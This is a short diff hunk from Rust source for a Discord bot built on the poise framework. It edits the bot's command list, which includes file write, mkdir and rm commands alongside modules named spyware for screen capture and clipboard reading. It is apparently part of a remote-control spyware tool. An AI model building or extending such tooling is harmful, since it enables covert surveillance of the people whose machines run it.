@@ -100,8 +100,7 @@ pub const COMMANDS: &[fn() -> poise::Command<crate::Data, crate::Error>] = &[
     io::write,
     io::mkdir,
     io::rm,
-    spyware::screenshot,
-    spyware::record,
+    spyware::screen,
     spyware::clipboard,
 ];
 
